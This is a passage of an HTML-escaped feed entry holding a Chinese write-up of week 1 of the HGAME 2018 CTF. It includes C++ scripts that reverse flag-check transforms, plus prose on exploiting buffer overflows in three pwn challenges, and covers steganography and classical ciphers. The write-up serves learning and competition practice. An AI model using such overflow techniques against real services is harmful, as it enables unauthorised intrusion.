+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_230513.png&quot; alt=&quot;re0&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;baby-crack&quot;&gt;baby_crack&lt;&#x2F;h2&gt;
+&lt;p&gt;拖进IDA，F5，读代码。发现对操作做了这样的操作：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;按位置进行循环移位&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180208_110243.png&quot; alt=&quot;baby_crack1&quot; &#x2F;&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;将输入的每个通过一个映射转到另一个&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_110549.png&quot; alt=&quot;baby_crack2&quot; &#x2F;&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;进行几轮交换&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_110559.png&quot; alt=&quot;baby_crack3&quot; &#x2F;&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;与flag进行同意操作得到的结果进行比较
+于是写出反着来的操作&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&amp;#x2F;&amp;#x2F;baby1.cpp
+#include &amp;lt;bits&amp;#x2F;stdc++.h&amp;gt;
+using namespace std;
+int indx[]={17,191,186,15,213,204,188,30,25,1,135,27,150,195,134,26,126,107,90,141,251,194,139,179,177,221,239,10,75,248,85,38,118,171,193,100,23,201,175,97,103,74,202,18,36,225,174,80,58,112,55,237,224,119,183,46,161,45,50,123,137,207,240,148,33,101,11,63,125,41,59,5,81,231,129,110,51,198,215,172,60,154,34,220,122,8,106,151,241,95,142,98,111,19,138,130,140,42,73,57,24,104,208,131,180,66,54,113,12,87,16,243,40,212,52,14,228,255,6,173,92,252,219,222,218,159,234,53,94,120,82,217,79,109,187,168,176,21,67,144,37,166,84,254,13,235,169,253,233,93,22,203,47,78,189,197,9,70,247,192,31,89,211,2,35,157,96,4,132,246,164,29,49,76,200,155,199,223,102,44,236,121,115,48,105,99,149,214,190,68,232,165,242,153,216,56,160,227,143,210,83,61,86,146,114,250,184,167,205,238,147,133,108,127,170,178,71,206,128,32,28,124,7,226,185,145,69,116,152,245,62,3,196,65,1,43,72,39,230,91,244,156,136,117,162,182,20,209,229,77,64,249,158,88,163};
+int arr[]={166,78,5,162,182,8,162,206,140,238,32,194,152,160,208,205,35,166,106,130};
+int main()
+{
+&amp;#x2F;&amp;#x2F;	int a;
+&amp;#x2F;&amp;#x2F;	while(cin&amp;gt;&amp;gt;a){
+&amp;#x2F;&amp;#x2F;		cout&amp;lt;&amp;lt;indx[a]&amp;lt;&amp;lt;endl;
+&amp;#x2F;&amp;#x2F;	}
+	for(int i=0;i&amp;lt;20;++i){
+		for(int j=0;j&amp;lt;256;++j){
+			if(indx[j]==arr[i]){
+				cout&amp;lt;&amp;lt;int(*(char*)(&amp;amp;j))&amp;lt;&amp;lt;&amp;#x27;,&amp;#x27;;
+			}
+		}
+	}
+	return 0;
+}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&amp;#x2F;&amp;#x2F;baby2.cpp
+#include &amp;lt;bits&amp;#x2F;stdc++.h&amp;gt;
+using namespace std;
+int arr[]={141,153,71,245,246,85,245,217,96,209,219,21,228,196,102,208,164,141,86,95};
+int main()
+{
+&amp;#x2F;&amp;#x2F;	for(int i=0;i&amp;lt;20;++i){
+&amp;#x2F;&amp;#x2F;		newa[indx[i]]=arr[i];
+&amp;#x2F;&amp;#x2F;	}
+&amp;#x2F;&amp;#x2F;	for(int i=0;i&amp;lt;20;++i){
+&amp;#x2F;&amp;#x2F;		cout&amp;lt;&amp;lt;newa[i]&amp;lt;&amp;lt;&amp;#x27;,&amp;#x27;;
+&amp;#x2F;&amp;#x2F;	}
+	swap(arr[10],arr[15]);
+	swap(arr[10],arr[6]);
+	swap(arr[6],arr[3]);
+	swap(arr[3],arr[1]);
+	swap(arr[0],arr[1]);
+	for(int i=0;i&amp;lt;20;++i){
+		printf(&amp;quot;%d,&amp;quot;,arr[i]);
+	}
+	return 0;
+}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&amp;#x2F;&amp;#x2F;baby3.cpp
+#include &amp;lt;bits&amp;#x2F;stdc++.h&amp;gt;
+using namespace std;
+uint8_t arr[]={208,141,71,153,246,85,245,217,96,209,245,21,228,196,102,219,164,141,86,95};
+unsigned char flg[22]=&amp;quot;&amp;quot;;
+int main()
+{
+	for(int i=0;i&amp;lt;20;++i){
+		bitset&amp;lt;8&amp;gt; a(arr[i]);
+		cout&amp;lt;&amp;lt;a&amp;lt;&amp;lt;endl;
+		if(i%4==1){
+			a=(a&amp;lt;&amp;lt;6)|(a&amp;gt;&amp;gt;2);
+		}else if(i%4==2){
+			a=(a&amp;gt;&amp;gt;4)|(a&amp;lt;&amp;lt;4);
+		}else if(i%4==3){
+			a=(a&amp;lt;&amp;lt;2)|(a&amp;gt;&amp;gt;6);
+		}else{
+			a=(a&amp;gt;&amp;gt;1)|(a&amp;lt;&amp;lt;7);
+		}
+		cout&amp;lt;&amp;lt;a&amp;lt;&amp;lt;&amp;#x27; &amp;#x27;&amp;lt;&amp;lt;a.to_ulong()&amp;lt;&amp;lt;endl;
+		flg[i]=a.to_ulong();
+	}
+	for(int i=0;i&amp;lt;20;++i){
+		cout&amp;lt;&amp;lt;char(flg[i]);
+	}
+}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;这里需要说一下……
+C&#x2F;C++的左右移有毒！换bitset保平安！&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;nop-pop&quot;&gt;nop_pop&lt;&#x2F;h2&gt;
+&lt;p&gt;一月霸权当然是我pop team epic啦！食我粪作！
+EXEinfo显示是PE文件，那就运行一下看
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180208_110751.png&quot; alt=&quot;nop_pop1&quot; &#x2F;&gt;
+打开OD搜一下
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_233230.png&quot; alt=&quot;nop_pop2&quot; &#x2F;&gt;
+先是把跳转nop掉，然后出来那个Con...的，联系出题人，出题人表示是要nop掉pop子
+于是再看，然后发现上面有个nop_me（提示真明显wwwww）
+nop掉，程序发给出题人，得到flag&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;sc2-player&quot;&gt;sc2_player&lt;&#x2F;h2&gt;
+&lt;p&gt;看了一下程序F5出来的东西大概做了这几步操作&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;arr=(index%7+35)^special&lt;&#x2F;li&gt;
+&lt;li&gt;special(index%7)=special^0x34&lt;&#x2F;li&gt;
+&lt;li&gt;arr=input^ index^(index&#x2F;7)
+这几个都是长度为28的数组，arr是最后用来比对的数组，input是输入的flag，special是一个程序存储的数组
+所以前两步有什么意义……&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&amp;#x2F;&amp;#x2F;sc2.cpp
+#include &amp;lt;bits&amp;#x2F;stdc++.h&amp;gt;
+using namespace std;
+char arr[29]={104,98,118,101,127,72,50,127,86,124,99,63,82,101,72,108,77,116,101,32,114,115,74,96,115,127,124,101};
+int main()
+{
+	for(int i=0;i&amp;lt;28;++i){
+		arr[i]=arr[i]^i^(i&amp;#x2F;7);
+	}
+	for(int i=0;i&amp;lt;28;++i){
+		putchar(arr[i]);
+	}
+}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h1 id=&quot;pwn&quot;&gt;PWN&lt;&#x2F;h1&gt;
+&lt;p&gt;前两题做的时候不在家，借朋友电脑用了下&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;guess-number&quot;&gt;guess_number&lt;&#x2F;h2&gt;
+&lt;p&gt;其实是很明显的溢出，scanf这个东西不安全，可以直接覆盖到比较的数字
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180207_222045.png&quot; alt=&quot;guess_number&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;flag-server&quot;&gt;flag_server&lt;&#x2F;h2&gt;
+&lt;p&gt;还是输入超限，不过一开始要输入长度而且还不能大于63，后面的对比又用!=（继续吐槽我那个超喜欢用!=的队友
+所以输入一个负数就好了
+然后就可以覆盖到猜测的数字了
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180207_221248.png&quot; alt=&quot;flag_server&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;zazahui&quot;&gt;zazahui&lt;&#x2F;h2&gt;
+&lt;p&gt;先看整个流程，发现它先把flag读进了一个固定地址
+这次换成了read，但是大小却是188，于是还是能搞事，直接用地址覆盖后面的*s就能输出flag了
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180208_112204.png&quot; alt=&quot;zazahui1&quot; &#x2F;&gt;
+本机测试过关直接发payload了，顺便*s后面是计数器，所以可以覆盖可以不覆盖，但是不能改成0，那样就直接退出了
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180207_220202.png&quot; alt=&quot;zazahui2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;misc&quot;&gt;Misc&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;bai-cai-1&quot;&gt;白菜1&lt;&#x2F;h2&gt;
+&lt;p&gt;先用stegsolver打开看了一遍，都没东西
+于是考虑lsb（算是常规套路了吧）
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_012851.png&quot; alt=&quot;白菜1_1&quot; &#x2F;&gt;
+然后文件头不熟练的我还跑了下binwalk,wwwwwww
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_013254.png&quot; alt=&quot;白菜1_2&quot; &#x2F;&gt;
+就是个zip包，解压出来就是flag&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;bai-cai-2&quot;&gt;白菜2&lt;&#x2F;h2&gt;
+&lt;p&gt;跑一下binwalk，发现有东西
+然后就得到了flag
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_230153.png&quot; alt=&quot;白菜2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;pacp1&quot;&gt;pacp1&lt;&#x2F;h2&gt;
+&lt;p&gt;搜下flag
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_225419.png&quot; alt=&quot;pacp1_1&quot; &#x2F;&gt;
+看最后这个返回200的分组
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_225549.png&quot; alt=&quot;pacp1_2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;crypto&quot;&gt;Crypto&lt;&#x2F;h1&gt;
+&lt;p&gt;知识点全部给出来了哇，真系给力&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;easy-caesar&quot;&gt;easy Caesar&lt;&#x2F;h2&gt;
+&lt;p&gt;一开始题目还有错，于是找出题人说，拿到了1血（然而改错没加分wwww）
+直接上工具
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180208_113617.png&quot; alt=&quot;easy_Caesar&quot; &#x2F;&gt;
+然后数字也有变过，那么按照常识判断，就是qu1ck,4x,la2y,br0wn
+于是有了flag&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;polybius&quot;&gt;Polybius&lt;&#x2F;h2&gt;
+&lt;p&gt;看到的时候就反应过来了，可惜当时没找到工具手解的……
+看它给的提示网址https:&#x2F;&#x2F;www.wikiwand[.]com&#x2F;en&#x2F;Polybius#&#x2F;Cryptography就行了，这种出题真的很照顾人了&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;hill&quot;&gt;Hill&lt;&#x2F;h2&gt;
+&lt;p&gt;学到了一种新的加密方式，不过要算数论中矩阵的逆，如果阶数高了，感觉就是灾难啊……
+顺便我又没找到工具一开始还没仔细看链接，矩阵的逆还是手算的……淦了
+同样的https:&#x2F;&#x2F;www.wikiwand[.]com&#x2F;en&#x2F;Hill_cipher
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_221038.png&quot; alt=&quot;Hill&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;confusion&quot;&gt;confusion&lt;&#x2F;h2&gt;
+&lt;p&gt;这个题就比较舒服，不就是大杂烩嘛，上工具~
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_211631.png&quot; alt=&quot;confusion1&quot; &#x2F;&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_211959.png&quot; alt=&quot;confusion2&quot; &#x2F;&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_212008.png&quot; alt=&quot;confusion3&quot; &#x2F;&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_212027.png&quot; alt=&quot;confusion4&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;baby-step&quot;&gt;baby step&lt;&#x2F;h2&gt;
+&lt;p&gt;刚学完密码学，然而不想自己手写
+网上直接找的python脚本太腊鸡了……慢得不行
+最后换ACM大佬博客找的就好了
+解出来基础解是191091022097，然后加上i个0x1111111111模0x976693344d的逆元就好，顺便后面这个数是质数，所以逆元可以用费马小定理算&lt;&#x2F;p&gt;
+</content>
+	</entry>
+</feed>
